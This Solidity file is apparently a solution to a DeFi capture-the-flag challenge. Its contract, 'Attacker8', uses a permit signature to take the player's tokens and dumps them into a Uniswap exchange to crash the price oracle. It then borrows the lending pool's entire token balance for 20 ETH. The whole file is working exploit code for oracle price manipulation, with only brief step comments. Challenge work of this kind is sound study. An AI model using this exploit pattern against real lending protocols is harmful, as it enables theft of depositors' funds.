// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "solmate/src/tokens/ERC20.sol";
import "hardhat/console.sol";

interface IPuppetPool {
    function borrow(uint256 amount, address recipient) external payable;
}

interface IUniswapExchange {
    function tokenToEthSwapInput(uint256 tokensSold, uint256 minETH, uint256 deadline) external;
}

contract Attacker8 {
    // 1. Permit, aprrove Token this this contract, it is similar to approve but in terms of signing instead of directly approve.
    // 2. Transfer Token from player to this contract.
    // 3. Approve Token to Uniswap Exchange
    // 4. Swap, Convert Token to ETH
    // 5. Borrow
    // . Transfer Token back to player
    constructor(address token_, address payable player, address exchange_, address pool_, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s) payable {
        ERC20 token = ERC20(token_);
        IUniswapExchange exchange = IUniswapExchange(exchange_);
        IPuppetPool pool = IPuppetPool(pool_);

        token.permit(player, address(this), amount, deadline, v, r, s);
        token.transferFrom(player, address(this), amount);
        token.approve(exchange_, amount);
        exchange.tokenToEthSwapInput(amount, 1, type(uint256).max);
        pool.borrow{value: 20 ether}(token.balanceOf(pool_), player);
        player.transfer(address(this).balance);
    }
}
